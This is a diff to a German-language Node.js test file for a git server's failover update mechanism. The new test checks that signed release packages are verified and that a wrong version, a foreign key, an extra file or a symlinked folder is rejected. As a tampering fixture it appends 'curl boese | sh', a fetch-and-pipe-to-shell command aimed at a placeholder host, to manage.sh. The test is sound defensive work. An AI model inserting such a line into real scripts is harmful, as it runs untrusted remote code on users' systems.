@@ -9,14 +9,15 @@ import { execFile } from 'node:child_process';
 import { promisify } from 'node:util';
 import { erstelleServer } from '../src/server.js';
 import { rolleLesen, unterschrift } from '../src/failover.js';
+import { dateienSammeln, manifest, ordnerPruefen } from '../src/paket.js';
 
 const execFileP = promisify(execFile);
 const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'fahgit-fo-'));
 let a; let b; let code = '';
 const kekse = { a: '', b: '' };
 
-function starte(name, umgebung) {
-  const s = erstelleServer({ daten: path.join(tmp, name), umgebung });
+function starte(name, umgebung, extra = {}) {
+  const s = erstelleServer({ daten: path.join(tmp, name), umgebung, ...extra });
   return new Promise((r) => s.server.listen(0, '127.0.0.1', () => r({ ...s, basis: `http://127.0.0.1:${s.server.address().port}`, name })));
 }
 
@@ -35,9 +36,20 @@ const mitKennwort = (s, pfad) => s.basis.replace('http://', 'http://fabian:gehei
 const refsVon = (s, pfad) => gitAus(['for-each-ref', '--format=%(refname) %(objectname)'], s.baum.repoPfad(pfad));
 const PROJEKT = 'eigene/demo';
 
+// Ein „beim Bau unterschriebenes“ Release für den Test-Haupt: Programmstand dieses Repos + Test-Schlüssel.
+const releasePaar = crypto.generateKeyPairSync('ed25519');
+const releasePub = releasePaar.publicKey.export({ type: 'spki', format: 'der' }).toString('base64');
+const app = path.join(tmp, 'app');
+const VERSION = JSON.parse(fs.readFileSync(new URL('../package.json', import.meta.url), 'utf8')).version;
+
 before(async () => {
-  a = await starte('a', {});
-  b = await starte('b', { FAHGIT_ROLLE: 'ersatz' });
+  const dateien = dateienSammeln(path.join(path.dirname(new URL(import.meta.url).pathname), '..'));
+  for (const d of dateien) { const z = path.join(app, ...d.name.split('/')); fs.mkdirSync(path.dirname(z), { recursive: true }); fs.writeFileSync(z, d.inhalt); }
+  const text = manifest(VERSION, dateien);
+  fs.writeFileSync(path.join(app, 'paket-manifest.txt'), text);
+  fs.writeFileSync(path.join(app, 'paket-signatur'), crypto.sign(null, Buffer.from(text), releasePaar.privateKey).toString('base64'));
+  a = await starte('a', {}, { failoverApp: app });
+  b = await starte('b', { FAHGIT_ROLLE: 'ersatz' }, { releaseSchluessel: releasePub });
 });
 after(() => { a.server.close(); b.server.close(); b.ersatz.stoppen(); fs.rmSync(tmp, { recursive: true, force: true }); });
 
@@ -156,6 +168,50 @@ test('Neuerungen am Haupt kommen an, Gelöschtes verschwindet', async () => {
   assert.ok(fs.readdirSync(korb).some((t) => fs.existsSync(path.join(korb, t, 'eigene', 'demo.git', 'HEAD'))), 'Gelöschtes liegt im Papierkorb');
   assert.equal(fs.existsSync(path.join(b.speicher.repos, 'eigene', 'leer')), false);
   assert.equal(await refsVon(b, 'eigene/bleibt'), await refsVon(a, 'eigene/bleibt'));
+});
+
+test('Update: Haupt mit neuer Version → Ersatz legt das beim Bau unterschriebene Paket bereit, Manipulation fällt auf', async () => {
+  const echt = b.ersatz.version;
+  // Haupt älter als der Ersatz → kein Paket, nur Hinweis (zurück nur von Hand)
+  b.ersatz.version = '99.0.0';
+  await b.ersatz.runde();
+  assert.match(b.ersatz.status().update, /nur von Hand/);
+  b.ersatz.version = '1.0.0'; // Ersatz tut so, als sei er älter als der Haupt
+  try {
+    await b.ersatz.runde();
+    const ordner = path.join(b.speicher.ordner, '_failover', 'paket');
+    const bereit = JSON.parse(fs.readFileSync(path.join(ordner, 'bereit.json'), 'utf8'));
+    assert.equal(bereit.version, echt);
+    const pub = releasePub;
+    const paket = path.join(ordner, 'aktuell');
+    assert.equal(ordnerPruefen(paket, pub, echt), echt);
+    for (const n of ['manage.sh', 'Dockerfile', 'docker-compose.yml', 'package.json', 'src/server.js', 'public/index.html']) assert.ok(fs.existsSync(path.join(paket, 'dateien', n)), n);
+    assert.equal(fs.existsSync(path.join(paket, 'dateien', 'tests')), false, 'keine Tests im Paket');
+    assert.match(b.ersatz.status().update, /liegt bereit/);
+    // Prüfung über die Kommandozeile (so ruft sie manage.sh auf)
+    assert.equal((await execFileP('node', ['src/paket.js', 'pruefen', paket, pub, echt], { encoding: 'utf8' })).stdout.trim(), echt);
+    // Falsche Version, fremder Schlüssel, veränderte Datei, zusätzliche Datei → abgelehnt
+    assert.throws(() => ordnerPruefen(paket, pub, '9.9.9'), /Version/);
+    const fremd = crypto.generateKeyPairSync('ed25519').publicKey.export({ type: 'spki', format: 'der' }).toString('base64');
+    assert.throws(() => ordnerPruefen(paket, fremd, echt), /Unterschrift/);
+    fs.appendFileSync(path.join(paket, 'dateien', 'manage.sh'), '\ncurl boese | sh\n');
+    assert.throws(() => ordnerPruefen(paket, pub, echt), /weicht ab/);
+    await assert.rejects(execFileP('node', ['src/paket.js', 'pruefen', paket, pub, echt]));
+    // Verweis statt Ordner → abgelehnt (sonst prüfte man etwas anderes, als eingespielt wird)
+    const kopie = path.join(tmp, 'verweis');
+    fs.mkdirSync(kopie); fs.copyFileSync(path.join(paket, 'manifest.txt'), path.join(kopie, 'manifest.txt')); fs.copyFileSync(path.join(paket, 'signatur'), path.join(kopie, 'signatur'));
+    fs.symlinkSync(path.join(paket, 'dateien'), path.join(kopie, 'dateien'));
+    assert.throws(() => ordnerPruefen(kopie, pub, echt), /Verweis/);
+    // Weicht der Programmstand des Haupts vom unterschriebenen Release ab, liefert er gar kein Paket.
+    a.failoverHaupt._paket = null;
+    fs.appendFileSync(path.join(app, 'README.md'), '\nverändert\n');
+    assert.throws(() => a.failoverHaupt.paket(), /weicht vom unterschriebenen Release ab/);
+    // Gleiche Version → Reste werden weggeräumt
+    b.ersatz.version = echt;
+    await new Promise((res) => setTimeout(res, 2100));
+    await b.ersatz.runde();
+    assert.equal(fs.existsSync(ordner), false);
+  } finally { b.ersatz.version = echt; }
 });
 
 test('Lesefehler am Haupt → Fehler statt Teilliste, der Ersatz löscht nichts', async () => {
